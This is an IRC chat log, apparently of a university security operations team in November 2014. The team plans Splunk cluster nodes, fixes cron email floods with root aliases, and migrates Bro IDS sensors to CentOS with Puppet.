2014-11-03 15:57:08	soehlert	three in total (warren says four but we all remember three and he cant think of what the fourth is so three)
2014-11-03 15:57:19	jschipp	lol
2014-11-03 15:57:20	soehlert	kinda long, but it follows our scheme, thats why im asking though
2014-11-03 15:57:29	wraquel	I swear there was a fourth.
2014-11-03 15:57:29	soehlert	i dont like them that long
2014-11-03 15:57:33	soehlert	what could it be?
2014-11-03 15:57:41	wraquel	spindex1 spindex2?
2014-11-03 15:57:42	soehlert	two for index and a search is all i ever knew
2014-11-03 15:57:48	jschipp	maybe shorten index to i
2014-11-03 15:57:49	wraquel	splindex
2014-11-03 15:57:53	jschipp	splunki-1
2014-11-03 15:58:00	wraquel	splunkidex
2014-11-03 15:58:12	soehlert	splindex is funner to say...but splunki might be better
2014-11-03 15:58:18	jschipp	spindex1-sec looks good too
2014-11-03 15:58:25	jschipp	I agree
2014-11-03 15:58:26	soehlert	splunki-1-sec and splunki-2-sec
2014-11-03 15:58:27	jschipp	that's the winner
2014-11-03 15:58:40	jschipp	oooOo
2014-11-03 15:58:52	jschipp	splunki1-sec
2014-11-03 15:58:57	jschipp	equally funny?
2014-11-03 15:59:42	wraquel	Looks like a search head and a cluster manager as VMs
2014-11-03 15:59:51	jschipp	Bjourne Strousup (wrote C++) is speaking at 4:30 in Siebel 
2014-11-03 16:02:25	jschipp	Do we know when we're going to get hardware for Cuckoo Sandbox? I've been waiting for this forever
2014-11-03 16:02:48	soehlert	we need hardware? we have plenty of hardware
2014-11-03 16:03:07	soehlert	wardog: right cluster manager is separate from search head, good call
2014-11-03 16:03:18	jschipp	last time we discussed it we didn't have a 64bit VT capabale machine 
2014-11-03 16:03:31	soehlert	ooo gotcha, i would imagine that hasnt changed then.
2014-11-03 16:03:36	jschipp	need hardware virtualization
2014-11-03 16:03:41	wraquel	Just looking at docs. Looks like a master node. The indexes are peer nodes, and then there's a search head.
2014-11-03 16:04:10	soehlert	jschipp: just amazed our servers dont have that ability
2014-11-03 16:04:36	wraquel	That seems odd. i figured they would
2014-11-03 16:04:44	soehlert	seriously hp? an entire flash page for specs?!
2014-11-03 16:05:00	soehlert	ahh nvm just a pdf
2014-11-03 16:06:42	soehlert	wait it looks like they do have that capability..
2014-11-03 16:07:16	soehlert	or at least according to some blog posts. hp docs are horrific.
2014-11-03 16:08:40	jschipp	link? last time I discussed it with eyrich we didn't have any
2014-11-03 16:08:54	soehlert	http://stretch-cloud.info/2012/03/best-practices-bios-parameters-in-hp-g7-servers-for-vmware-vsphere-5-0/i
2014-11-03 16:09:03	soehlert	 can check for sure later when i go to pcf to kickstart a machine
2014-11-03 16:09:14	jschipp	okay, awesome, I appreciate it
2014-11-03 16:09:49	wraquel	jschipp: what about those machines that I had borrowed from you? Those could do VMs. I ran ESX for the CTF off them.
2014-11-03 16:10:29	jschipp	yeah, but ESX doesn't require hardware virtualization
2014-11-03 16:11:47	jschipp	Looking to use Xen Project or KVM
2014-11-03 16:12:52	jschipp	the recommend OS is Ubuntu which is perfect because their Xen packages are awesome
2014-11-03 16:24:23	soehlert	why are you against esx?
2014-11-03 16:24:27	soehlert	just curious
2014-11-03 16:31:57	jschipp	I'm not but it's not the recommended platform for Cuckoo Sandbox, cuckoo needs to fire up VM's upon malware sample submission
2014-11-03 16:34:12	soehlert	gtocha
2014-11-04 08:08:12	jazoff	morning :)
2014-11-04 09:05:05	wraquel	welcome back
2014-11-04 09:05:12	wraquel	how was the music fest?
2014-11-04 09:06:51	jazoff	loud
2014-11-04 09:10:59	jazoff	ears still hurt a little
2014-11-04 09:28:54	jazoff	fgrep for jeffc finally finished..
2014-11-04 09:29:02	jazoff	[jazoff@lowp ~]$ du -hs jeffc.log;wc -l jeffc.log
2014-11-04 09:29:02	jazoff	345M    jeffc.log
2014-11-04 09:29:03	jazoff	1625525 jeffc.log
2014-11-04 09:29:03	wraquel	heh. Was just going to ask about that.
2014-11-04 09:30:15	wraquel	Thoughts on including clear http auth in gulp?
2014-11-04 09:30:39	jazoff	may have too much noise from scanners
2014-11-04 09:31:03	jazoff	can mayybe ignore entries that responded with 403/401
2014-11-04 09:31:16	jazoff	though there is nothing stopping a client from getting http://admin:admin@www.ncsa.illinois.edu
2014-11-04 09:34:12	wraquel	Hey, is proxy detection disabled in bro?
2014-11-04 09:34:20	jazoff	proxy detection?
2014-11-04 09:34:26	wraquel	Not seeing any bro_proxy sources or proxy.log on supercell
2014-11-04 09:34:46	jazoff	oh, maybe it's not sent to splunk?
2014-11-04 09:35:15	jazoff	hmm
2014-11-04 09:35:15	wraquel	Maybe. I couldn't find any in the current supercell logs.
2014-11-04 09:35:18	jazoff	yeah
2014-11-04 09:35:52	jazoff	oh, i was thinking of tunnel.log, which exists
2014-11-04 09:36:23	jazoff	i dont think there is a proxy.log
2014-11-04 09:37:41	wraquel	hmmm
2014-11-04 09:37:45	wraquel	maybe that's what I'm looking for
2014-11-04 09:38:24	wraquel	is there a bro_tunnel sourcetype in splunk>
2014-11-04 09:38:34	wraquel	Speaking of. Campus has their licenses and we can get ours whenever.
2014-11-04 09:38:57	eyrich	from Matt E: open-nsm is also sending out a ton of email.
2014-11-04 09:39:04	wraquel	sigh
2014-11-04 09:39:07	eyrich	ther first one reported is cif
2014-11-04 09:39:12	wraquel	jschipp: 
2014-11-04 09:39:31	wraquel	and there's bro_tunnel
2014-11-04 09:39:53	jazoff	yep
2014-11-04 09:39:57	wraquel	looks like we have a few Teredo tunnels
2014-11-04 09:40:04	jazoff	not unexpected
2014-11-04 09:48:56	soehlert	wraquel: you might have seen a proxy.log at one point in time as i had written an open proxy detection script, but it never got to a real production state so i dont think its running anymore
2014-11-04 09:49:51	wraquel	Phew. I'm not crazy then.
2014-11-04 09:52:41	soehlert	not this time :)
2014-11-04 10:21:17	jazoff	yay, comcast went down
2014-11-04 10:21:35	wraquel	Didn't that happen over the weekend?
2014-11-04 10:21:36	wraquel	Still having issues?
2014-11-04 10:21:54	jazoff	i wasn't home over the weekend so I dunno
2014-11-04 10:24:17	soehlert	comcast in general or jazoff's comcast? cuz i didnt hear anything. also, how are you still connected without comcast?
2014-11-04 10:24:42	wraquel	soehlert: a python script, I'm sure.
2014-11-04 10:25:41	eyrich	:)
2014-11-04 10:28:03	soehlert	hahah
2014-11-04 10:28:20	eyrich	and hey - that smy joke
2014-11-04 10:29:58	jazoff	thothrough phone
2014-11-04 10:29:59	jazoff	..slowly
2014-11-04 10:33:17	jazoff	rebooted stuff, seesm to work again
2014-11-04 10:44:18	wraquel	sooooo.. where's jschipp?
2014-11-04 10:46:13	soehlert	im gonna head to vote in a minute (i've found 11 to be the sweetspot at my place) then i'll be at npcf. you wanna get moving on this bro stuff jazoff?
2014-11-04 10:51:28	soehlert	jazoff: also, splunk machines. 1 master, 1 search node, 2 indexers correct? And what subnet should they be on?
2014-11-04 10:51:55	wraquel	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20%22too%20many%20hops%22%20%7C%20rex%20field%3D_raw%20%22to%20%3C(%3F%3Cdest%3E.*)%3E%22%20%7C%20table%20dest%20%7C%20chart%20count%20by%20dest&earliest=-7d%40h&latest=now
2014-11-04 10:52:28	jazoff	i think the master and search node can be the same VM
2014-11-04 10:54:06	wraquel	looks like the nagios systems need to have email tweaked as well.
2014-11-04 10:54:13	wraquel	is monsoon ours?
2014-11-04 10:54:43	wraquel	opennsm is certainly the top offender right now.
2014-11-04 10:54:45	soehlert	ya
2014-11-04 10:54:54	soehlert	monsoon is ours
2014-11-04 10:55:02	soehlert	jazoff: ok. what subnet?
2014-11-04 10:55:50	jazoff	i think the indexer boxes can be on private and the others should be both
2014-11-04 10:57:49	soehlert	ok
2014-11-04 10:57:55	jazoff	not sure if the master and search head can be on the same box
2014-11-04 10:58:06	jazoff	but small vms should work fine for both
2014-11-04 10:58:26	jazoff	though i think the search head can benefit from some ram+cpu to crunch results
2014-11-04 11:00:44	eyrich	more stuff from Matt E
2014-11-04 11:00:45	eyrich	Something bad is happening on the .148 subnet. A whole host of hosts are sending us a ton of email. Any ideas?
2014-11-04 11:00:54	wraquel	jschipp: still looks like logs from rsa that are being forwarded from relay-sec are still malformed.
2014-11-04 11:01:11	jazoff	is this email problem something new, or something they are just noticing?
2014-11-04 11:01:37	wraquel	jazoff: tweak the splunk search above to a daily graph
2014-11-04 11:02:27	soehlert	wait so now we do need another vm jazoff? ugh right after sending in the request..
2014-11-04 11:02:52	soehlert	can the search be internal only?
2014-11-04 11:03:15	jazoff	soehlert: the search head? i suppose so
2014-11-04 11:03:34	soehlert	is public preferred?
2014-11-04 11:03:56	jazoff	no.. trying to think if anything actually needs to be public
2014-11-04 11:04:32	soehlert	ugh make up your damn mind man haha
2014-11-04 11:05:10	jazoff	ok, indexers should definitely be private
2014-11-04 11:05:18	soehlert	so not both?
2014-11-04 11:05:39	jazoff	right
2014-11-04 11:05:51	soehlert	so nothing needs to be both now?
2014-11-04 11:05:51	soehlert	everything is private only?
2014-11-04 11:06:12	jazoff	hmmmmm
2014-11-04 11:06:30	jazoff	so fowarders connect to indexers, (aka supercell or syslog boxes)
2014-11-04 11:06:44	soehlert	right
2014-11-04 11:07:03	jazoff	master connects to everything, search head connects to everything
2014-11-04 11:08:05	soehlert	right
2014-11-04 11:08:19	jazoff	so, private everything should be ok
2014-11-04 11:08:27	jschipp	here
2014-11-04 11:08:36	jschipp	looking into it
2014-11-04 11:08:45	soehlert	uhhhh ok
2014-11-04 11:08:50	eyrich	re email thing - new i think please contact M Elliot or C lindsay 
2014-11-04 11:10:21	soehlert	jazoff: request has been made. going to vote. be at npcf in a bit. then bro centos stuff?
2014-11-04 11:10:31	jazoff	ok.
2014-11-04 11:10:43	jazoff	I making lunch shortly
2014-11-04 11:15:57	jschipp	I don't see any changes to the systems, anyone have any guesses on why this just started?
2014-11-04 11:16:02	jschipp	^email issue
2014-11-04 11:16:28	wraquel	It looks like it's been going on a while
2014-11-04 11:16:34	wraquel	They only just noticed.
2014-11-04 11:17:05	jschipp	where did you hear that?
2014-11-04 11:17:14	wraquel	I'm looking at stats
2014-11-04 11:17:35	wraquel	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20%22too%20many%20hops%22%20%7C%20rex%20field%3D_raw%20%22to%20%3C(%3F%3Cdest%3E.*)%3E%22%20%7C%20timechart%20span%3D1d%20count(dest)%20by%20dest&earliest=-30d%40d&latest=now
2014-11-04 11:17:42	wraquel	I think I did that right.
2014-11-04 11:17:51	wraquel	Only goes back 12 days though
2014-11-04 11:19:43	jschipp	hmmm
2014-11-04 11:20:35	wraquel	jazoff: hmmm... Logs that big, guess we can't just push that to git.
2014-11-04 11:20:41	wraquel	jazoff: re: jeffc
2014-11-04 11:21:11	jazoff	yeah.. i added it using git-annex.. still need to figure out a place to push the large objects though
2014-11-04 11:21:21	jazoff	normally you can do a git annex copy --to origin, but not with gitlab
2014-11-04 11:21:26	jazoff	at least not by default
2014-11-04 11:31:00	wraquel	uh.... what happened to grid-sec.org?
2014-11-04 11:31:04	jschipp	okay, so it's the cronjobs, MAILTO=root and it's not sending to the local root mailbox but to root@$FQDN
2014-11-04 11:31:33	wraquel	do we need to add an MX for all our systems and point them to a single system?
2014-11-04 11:31:43	wraquel	At least to future proof issues like this?
2014-11-04 11:33:04	jschipp	the issue is that the mailbox doess't exist, how would that help?
2014-11-04 11:35:06	wraquel	creating an MX record?
2014-11-04 11:35:47	jschipp	yeah, they're going to the right mail server AFAIK
2014-11-04 11:37:45	wraquel	Which mail server is that?
2014-11-04 11:38:06	jschipp	the ncsa mail server
2014-11-04 11:38:17	wraquel	root@cif.ncsa.illinois.edu is the target email.
2014-11-04 11:38:20	wraquel	for example.
2014-11-04 11:38:23	wraquel	Where is that supposed to go?
2014-11-04 11:38:55	jschipp	my point is that shouldn't happen because that mailbox doesn't exist
2014-11-04 11:39:35	jschipp	I'm trying to understand waht you're wanting to accomplish with the MX record for our stuff
2014-11-04 11:40:03	jschipp	but I think I see what you're saying now i.e. forward all mail like that to a system where we can look at it later locally
2014-11-04 11:40:05	jschipp	is that right?
2014-11-04 11:40:27	wraquel	If anything to detect issues like this down the road.
2014-11-04 11:40:45	wraquel	Looks like the MX record for cif.ncsa.illinois.edu is mail.ncsa.uiuc.edu
2014-11-04 11:40:53	jschipp	then I agree, that's a good idea
2014-11-04 11:41:33	jschipp	who runs monsoon btw, that's on the list too
2014-11-04 11:54:56	wraquel	htat's ours
2014-11-04 11:56:00	jschipp	I know that but I meant the admin
2014-11-04 11:58:05	soehlert	well that means me then
2014-11-04 11:58:18	soehlert	sorry that sounded snottier than i meant. its my box
2014-11-04 11:58:51	jschipp	lol
2014-11-04 11:59:05	jazoff	do we push out an aliases file that sets root to one of the mailing lists?
2014-11-04 11:59:20	jazoff	if one does 'echo hi | mail root' where does it go now?
2014-11-04 11:59:45	jschipp	that would be a quick fix I think
2014-11-04 12:00:15	soehlert	hmm i think we used to, but i probably have been forgetting to do that and i doubt jschipp knew to do that. sounds like a quick puppet thign
2014-11-04 12:03:32	jschipp	jazoff: yeah, at least on the systems hvaing the issue it's doesn't go to the local mailbox as mentioned previously but to the mail server at 141.142.199.4
2014-11-04 12:04:54	jschipp	wraquel: I changed the rsyslog template and thought it worked as I didn't see any mangled messages from the rsa machines in Splunk after I did it. What query are you using?
2014-11-04 12:04:58	jazoff	https://cloud.google.com/container-engine/
2014-11-04 12:05:03	jschipp	did that a few weeks ago
2014-11-04 12:05:42	wraquel	jschipp: "audit.runtime.com.rsa"| table _raw
2014-11-04 12:05:43	jschipp	and it get mangled on cyclone not on the relays if I remember correctly
2014-11-04 12:05:58	wraquel	check last few minutes
2014-11-04 12:06:11	jschipp	err, I really need to learn how to use splunk
2014-11-04 12:06:32	wraquel	It gets to the relays fine but once it leaves the relays it gets messed up
2014-11-04 12:09:43	jschipp	jazoff: are you doing the aliases file then? or soehlert or me
2014-11-04 12:11:26	jazoff	i was not.. not sure how sendmail does that
2014-11-04 12:11:42	jazoff	things are a little confusing since I think some boxes have both sendmail and postfix installed
2014-11-04 12:11:53	soehlert	just /etc/aliases point root to security-admin
2014-11-04 12:12:14	soehlert	and ya once we get all this big move stuff sorted i wanna look at sendmail vs postfix
2014-11-04 12:12:59	wraquel	Do you need to add a MAILTO variable for crontab files?
2014-11-04 12:13:05	jschipp	wraquel: those logs look right to me in that query with tables_raw
2014-11-04 12:13:20	wraquel	notice the gap in the hour: min:sec
2014-11-04 12:13:40	wraquel	hmm
2014-11-04 12:14:08	wraquel	actually.. Looks that's the only issue. Does appear to be parsing the host correctly at least.
2014-11-04 12:14:45	jschipp	wraquel: all syslog messages have that gap
2014-11-04 12:15:09	jschipp	two spaces between the month and the day
2014-11-04 12:16:08	jazoff	do you still have to run newalises with sendmail?
2014-11-04 12:16:34	soehlert	ya
2014-11-04 12:17:39	jschipp	all with that common format I should said, RFC says other formats are valid but that's the most common
2014-11-04 12:19:29	jschipp	wraquel: "the 7th day of August would be
2014-11-04 12:19:30	jschipp	         represented as "Aug  7", with two spaces between the "g" and
2014-11-04 12:19:30	jschipp	         the "7".
2014-11-04 12:19:35	jschipp	err, http://www.ietf.org/rfc/rfc3164.txt
2014-11-04 12:21:06	jschipp	lol anyways
2014-11-04 12:21:38	jschipp	jazoff: thanks for posting the container platform from Google
2014-11-04 12:21:59	jschipp	jazoff: by the way, I set up a few collectd and graphite servers, love it
2014-11-04 12:22:40	jazoff	yeah. graphite is kinda dead though
2014-11-04 12:22:40	jschipp	seems like a better solution than munin 
2014-11-04 12:22:55	jschipp	you sure about that?
2014-11-04 12:23:02	jazoff	yes
2014-11-04 12:23:03	jschipp	I still see articles all the time
2014-11-04 12:23:27	jazoff	http://grafana.org/ is a better frontend
2014-11-04 12:23:35	jschipp	oh, ferk, you're right, gd
2014-11-04 12:23:44	jazoff	and works with influxdb which is potentially a better backend
2014-11-04 12:23:52	jschipp	didn't notice the last up date time
2014-11-04 12:23:54	jazoff	there is also cyanite, which is a fork of graphtie that uses cassandra
2014-11-04 12:24:28	jazoff	but yeah, it is nice. graphite is just a disaster operationally
2014-11-04 12:24:50	jschipp	hmm, seems grafana is a frontend for graphite
2014-11-04 12:25:53	jschipp	err, you said that, sorry, scatter-brained this morning
2014-11-04 12:29:57	soehlert	ok jazoff how do you wanna do this?
2014-11-04 12:33:54	wraquel	soehlert: which host was hosting grid-sec.org?
2014-11-04 12:33:59	wraquel	Cause the DNS record is now gone.
2014-11-04 12:35:22	jazoff	soehlert: bro?
2014-11-04 12:36:05	soehlert	wraquel: crap, it's written on my whiteboard, bottom left of my half. cant remember off the top of my head
2014-11-04 12:36:16	soehlert	zephyr or snow or..?
2014-11-04 12:36:16	soehlert	jazoff: ya
2014-11-04 12:36:25	wraquel	hmmm. might be snow...
2014-11-04 12:36:29	soehlert	fixed kickstart-sec so now im ready to roll on this. i cant remember our plan
2014-11-04 12:36:36	jazoff	soehlert: ok, first step is take a box or two out of the gigamon
2014-11-04 12:36:45	jazoff	i guess one box to start is best
2014-11-04 12:36:46	soehlert	paging dr eyrich 
2014-11-04 12:36:58	wraquel	Nope. zephyr
2014-11-04 12:37:05	jazoff	oh, we have 8, so 2 is fine
2014-11-04 12:37:09	wraquel	Does that need to be migrated?
2014-11-04 12:37:11	jazoff	got supecell and bro-dev mixed up
2014-11-04 12:38:08	soehlert	zephyr does if its not going away. 
2014-11-04 12:38:43	wraquel	Yeah, we need to move it then. No hurry but if I'm going to fix the DNS issue, we could probably do it all in one go.
2014-11-04 12:39:08	soehlert	can we move it to a vm?
2014-11-04 12:39:12	soehlert	and what all is on there?
2014-11-04 12:39:17	wraquel	yep.
2014-11-04 12:39:27	wraquel	It's just a mediawiki wiki
2014-11-04 12:39:45	soehlert	ah hell. does someone wanna be nice and just write the damn mediawiki puppet thing for me? gross..
2014-11-04 12:40:17	wraquel	What are you doing to ops-security.xsede? That's running mediawiki?
2014-11-04 12:40:31	wraquel	Whatever you're doing for that should work in the interim.
2014-11-04 12:41:00	jschipp	soehlert: zephyr is written next to grid-sec on the whiteboard
2014-11-04 12:41:52	soehlert	perfect thanks. wraquel i installed it by hand which sucked almost as bad as trying to puppetize it
2014-11-04 12:47:26	wraquel	soehlert: I don't mind installing and transferring it over.
2014-11-04 12:47:43	wraquel	If the setup is the same as the xsede wiki it'll be easy.
2014-11-04 12:49:41	wraquel	feel free to call the new vm grid-sec.ncsa.illinois.edu and have a cname for grid-sec.org pointing to it.
2014-11-04 12:49:58	wraquel	although, that makes it look like one of ours....
2014-11-04 12:50:15	wraquel	well, whatever works for you
2014-11-04 12:51:53	soehlert	why would that make it look like one of ours?
2014-11-04 12:52:01	soehlert	the cname would be what we give out no?
2014-11-04 12:52:02	wraquel	the naming convention
2014-11-04 12:52:07	wraquel	grid-sec
2014-11-04 12:52:16	wraquel	since we're using -sec
2014-11-04 12:52:41	wraquel	Just... whatever.
2014-11-04 12:54:38	soehlert	oh well we're the only ones who would notice probably
2014-11-04 12:59:42	soehlert	so uhhh how do i get a cname? just ask neteng when i get the A record?
2014-11-04 12:59:49	wraquel	yep
2014-11-04 12:59:56	soehlert	ok
2014-11-04 13:22:46	soehlert	ugh i get bitched at to deal with "emergency tickets" and then a whole weekend and a day and a half go by with no response from them..
2014-11-04 13:23:17	wraquel	You should page the.
2014-11-04 13:23:18	wraquel	m
2014-11-04 13:23:21	wraquel	each and everyone of them.
2014-11-04 13:23:23	wraquel	twice.
2014-11-04 13:24:21	soehlert	i really want to. they tell me its an emergency then dont give me the info i need to get my job done for them and dont respond..
2014-11-04 13:29:26	soehlert	wraquel: just gotta get the DNS stuff done and then I'll add kerb login and grid-sec will be ready for you to play with
2014-11-04 13:30:31	soehlert	jazoff: flows-sec is having issues with setting ownership and permissions for /data/nfdump
2014-11-04 13:30:52	jazoff	oh, that puppet rule? 
2014-11-04 13:31:04	jazoff	i think things are ok and we maybe just dont need that statement
2014-11-04 13:31:22	soehlert	ya that puppet thing again
2014-11-04 13:31:30	soehlert	you can look at the puppet dashboard for exact info if ya need 
2014-11-04 13:33:13	jschipp	hmm, I don't have permissions to do real-time searches in Splunk
2014-11-04 13:34:47	jazoff	also, there is this error
2014-11-04 13:34:50	jazoff	2014-11-04T12:22:13.443332-06:00 flows-sec nfsidmap[9971]: nss_getpwnam: name 'secops@ncsa.illinois.edu' does not map into domain 'internal.ncsa.edu'
2014-11-04 13:35:04	soehlert	huh?
2014-11-04 13:35:10	soehlert	whats that for?
2014-11-04 13:35:15	jazoff	nfs
2014-11-04 13:35:19	jazoff	the domain is wrong somewhere
2014-11-04 13:35:35	jazoff	probably not harming anything though
2014-11-04 13:35:58	jazoff	though that might be why the files in nfs are owned by nobody
2014-11-04 13:36:43	soehlert	where would that be? the hostname stuff is all correct.
2014-11-04 13:37:06	jazoff	not sure
2014-11-04 13:37:08	soehlert	it seems like some conf file has secops@ncsa.illinois.edu set, but idk what that would be
2014-11-04 13:37:26	soehlert	[root@flows-sec ~]# grep -r secops@ncsa.illinois.edu /etc/*
2014-11-04 13:37:26	soehlert	[root@flows-sec ~]#
2014-11-04 13:37:36	jazoff	no, it would just be ncsa.illinios.edu
2014-11-04 13:37:39	jazoff	secops is just the user part
2014-11-04 13:38:36	soehlert	is it related to this by chance? /etc/cron.d/nfsentt:10 0 * * * secops /home/secops/tt_report/run_report 2>&1 | mail -s '[sa-topn] Daily TopN' security-admin@ncsa.illinois.edu
2014-11-04 13:38:47	jazoff	no
2014-11-04 13:38:48	soehlert	nvm that doesnt make sense
2014-11-04 14:36:30	eyrich	her
2014-11-04 14:36:32	eyrich	here
2014-11-04 14:36:35	soehlert	jazoff: you here?
2014-11-04 14:39:09	jazoff	yep
2014-11-04 14:39:13	jazoff	bro time?
2014-11-04 14:43:31	soehlert	yup
2014-11-04 14:43:50	jazoff	hooefully I won't have to do anything :)
2014-11-04 14:43:59	jazoff	if the puppet stuff works it should rebuild itself
2014-11-04 14:44:16	soehlert	thats what im thinking. eyrich we need you to take out two memebers from the cluster on the gigamon
2014-11-04 14:44:32	eyrich	how long is going to take?
2014-11-04 14:45:12	soehlert	well i guess we can just do two today. I mean even if they break 1) jazoff should be able to fix it 2) if we have to roll with 6 cluster workers for a night we'll be fine
2014-11-04 14:45:19	eyrich	ok
2014-11-04 14:45:29	eyrich	im working on getting in the gigamon
2014-11-04 14:45:33	soehlert	k
2014-11-04 14:50:33	soehlert	did someone add a user to monsoon or something>
2014-11-04 14:50:48	wraquel	not i
2014-11-04 14:51:26	eyrich	ok, im ready, tell me which boxes you are removing and I will shift their traffic else where
2014-11-04 14:51:45	soehlert	jazoff: do you have a preference on which two?
2014-11-04 14:52:33	jazoff	hmm
2014-11-04 14:52:46	jazoff	nids 22 and nids 23
2014-11-04 14:52:48	jazoff	(first 2)
2014-11-04 14:53:20	eyrich	can I shift the traffic before we do anything and some one make sure the right 2 stop getting traffic
2014-11-04 14:54:10	soehlert	ya i won't do anything until we've verified
2014-11-04 14:58:49	eyrich	still working on it, having issues
2014-11-04 15:01:15	eyrich	wont let me delete a connection
2014-11-04 15:03:20	soehlert	like it's just not possible? or just having issues at the moment?
2014-11-04 15:03:28	eyrich	issues
2014-11-04 15:04:15	soehlert	ok
2014-11-04 15:04:22	soehlert	do you want to table it til tomorrow?
2014-11-04 15:04:27	eyrich	i got it
2014-11-04 15:04:31	soehlert	you sound like you wanna get outta here..
2014-11-04 15:04:45	jazoff	yep, nids-22 no traffic
2014-11-04 15:04:50	jazoff	and now nids-23 as well
2014-11-04 15:04:50	eyrich	nope - im good
2014-11-04 15:04:53	soehlert	ok
2014-11-04 15:05:03	eyrich	that traffic has been passed to 24 and 25
2014-11-04 15:05:04	soehlert	well here we go jazoff..
2014-11-04 15:05:23	jazoff	just make sure you get the right ones :)
2014-11-04 15:05:58	soehlert	definitely gonnna triple check
2014-11-04 15:24:59	jazoff	well, nids-22 went down
2014-11-04 15:25:26	soehlert	ya its back up and centos, just adding to puppet and giving you access if you need
2014-11-04 15:30:04	soehlert	hmm cant get the node request to work...realized there was nids-22 already in puppet so i removed that, but now i dont think the script will attempt to install since it already "did" on centos nids-22
2014-11-04 15:30:59	jazoff	script?
2014-11-04 15:31:05	soehlert	the curl command to add an agent
2014-11-04 15:31:09	soehlert	runs a bash script
2014-11-04 15:31:21	jazoff	oh
2014-11-04 15:31:22	soehlert	that basically asks the server to add it
2014-11-04 15:31:45	jazoff	is that before or after it installs puppet?
2014-11-04 15:31:58	soehlert	dunno but i think i realized the issue
2014-11-04 15:32:11	soehlert	yup all good
2014-11-04 15:32:19	soehlert	had to remove the pem file on the agent and try again
2014-11-04 15:33:50	soehlert	ok it's running the first puppet run, should have access in a few minutes for you to mess around.
2014-11-04 15:35:43	soehlert	oh and i cant log into thruk so if somone wants to do maintenance mode on nids-23 that would be nice
2014-11-04 15:46:17	jschipp	done, working on thruk atm, ACL issue
2014-11-04 15:47:09	soehlert	ahh ok cool
2014-11-04 15:47:30	soehlert	jazoff: nids-22 seems to be working well based on puppet runs. just one error kept popping up about jmelloc or something
2014-11-04 15:47:42	soehlert	but you also have kerb ssh access now if you need to investigate anything
2014-11-04 15:50:22	jazoff	yeah, looks like they are some ordering issues
2014-11-04 15:50:31	jazoff	it didnt put on epel, looks like the last run installed epel
2014-11-04 15:50:38	jazoff	i must be missing an include epel somewhere
2014-11-04 15:50:38	soehlert	ah ok
2014-11-04 15:51:01	soehlert	oh damn im gonna have to configure the myricom nics arent i?
2014-11-04 15:51:20	jazoff	no
2014-11-04 15:51:23	jazoff	you shouldn't have to
2014-11-04 15:51:30	soehlert	oh really? you have that in puppet?
2014-11-04 15:51:37	jazoff	yeah, it's just an rpm
2014-11-04 15:51:43	eyrich	what about the lic?
2014-11-04 15:51:46	soehlert	no i mean the ip address and stuff
2014-11-04 15:52:01	eyrich	dont need an IP - do you?
2014-11-04 15:52:15	soehlert	huh? the myricom nics dont have an IP/
2014-11-04 15:52:16	eyrich	in sniffer mode they only listen
2014-11-04 15:52:17	jazoff	the license gets loaded into the EEPROM or whatever so it should remember it
2014-11-04 15:52:23	eyrich	ah ok
2014-11-04 15:52:35	soehlert	if not the license is just a plain text file right?
2014-11-04 15:52:39	jazoff	and I wrote a broctl plugin that will ifup a nic before bro starts, so that should take care of that
2014-11-04 15:52:46	soehlert	ahhh perfect
2014-11-04 15:52:48	jazoff	kinda.. it is stored in a plain text file, but you need to load it
2014-11-04 15:53:01	jazoff	you'd think their init script would do it or whatever but it doesnt
2014-11-04 15:53:19	jazoff	I was going to add that to bro, but couldn't figure out how to test... when we get the v3 licences I can figure it out
2014-11-04 15:53:23	soehlert	oh thats right
2014-11-04 15:53:26	jazoff	er, to puppet
2014-11-04 15:53:28	soehlert	forgot about that part
2014-11-04 15:53:52	soehlert	well i appreciate the broctl plugin for ifup good work. less i ahve to do, less i can screw up
2014-11-04 15:54:43	soehlert	gah i need to change this puppet console logout garbage. its like 2 minutes of inactivity
2014-11-04 15:56:37	eyrich	ready for traffic?
2014-11-04 15:57:56	jazoff	not yet
2014-11-04 16:00:30	jazoff	hiera missing the ssh config apparently
2014-11-04 16:00:34	jazoff	quick fix should get it up and running
2014-11-04 16:03:09	soehlert	nids-23 should be ready for ya too.
2014-11-04 16:03:24	jazoff	that is, if you use the right key, doh
2014-11-04 16:03:44	soehlert	?
2014-11-04 16:04:21	jazoff	hmm
2014-11-04 16:05:08	jazoff	oh, the ssh module isn't added either
2014-11-04 16:05:13	jazoff	so it's not getting the bro specific sshd config
2014-11-04 16:05:42	soehlert	wraquel: i cant remember are we on rhsm or rhn classic now?
2014-11-04 16:08:17	eyrich	damn I was on bwbh1
2014-11-04 16:08:29	soehlert	sorry, i sent out the email yesterday with the warning
2014-11-04 16:08:45	eyrich	ya - i know
2014-11-04 16:12:03	jazoff	have to go vote, brb
2014-11-04 16:12:47	soehlert	is bro looking ok?
2014-11-04 16:12:56	jazoff	almost
2014-11-04 16:14:02	jazoff	might be something up with the myricom card.. will get it working tonight though
2014-11-04 16:14:11	jazoff	afk..
2014-11-04 16:15:12	soehlert	eyrich: initial thoughs on glasgows email?
2014-11-04 16:15:38	eyrich	I will stop scanning, Im writing a response.
2014-11-04 16:16:52	soehlert	that doesn't boast well for them..
2014-11-04 16:17:13	eyrich	crap software if a 3rd party tickling your ports causes problems
2014-11-04 16:18:09	soehlert	exactly my point. like nobody else is ever gonna scan them? yikes
2014-11-04 16:20:26	eyrich	I talked with Jason and he was like well the BHR protects us from that. so now the BHR is their friend
2014-11-04 16:21:26	jschipp	what e-mail address do we want to alias root to?
2014-11-04 16:21:35	soehlert	security-admin
2014-11-04 16:21:58	jschipp	kk
2014-11-04 16:22:15	soehlert	thanks
2014-11-04 16:22:43	jschipp	p
2014-11-04 16:22:44	jschipp	err
2014-11-04 16:22:44	jschipp	np
2014-11-04 16:39:02	eyrich	how close to traffic time?
2014-11-04 16:41:55	soehlert	gotta ask jazoff 
2014-11-04 16:42:12	soehlert	it might be a wait til tomorrow
2014-11-04 16:42:12	soehlert	"16:14:02   jazoff | might be something up with the myricom card.. will get it working tonight though"
2014-11-04 16:52:50	eyrich	im heading home
2014-11-04 16:53:12	eyrich	I can turn the traffic on from there, if somone sends me a sms or IM
2014-11-04 16:54:56	jazoff	back
2014-11-04 16:56:33	jazoff	hmm, the myricom rpm seems to have not installed the init script
2014-11-04 16:58:35	soehlert	weird
2014-11-04 16:58:57	jazoff	ah
2014-11-04 16:59:05	jazoff	destination = /opt/snf/sbin
2014-11-04 16:59:06	jazoff	  *** myri_snf.ko with MYRI_MCP=default ... error
2014-11-04 16:59:06	jazoff	ERROR building myri_snf.ko, output available in /tmp/myri_snf.log
2014-11-04 16:59:14	jazoff	probably needs gcc?
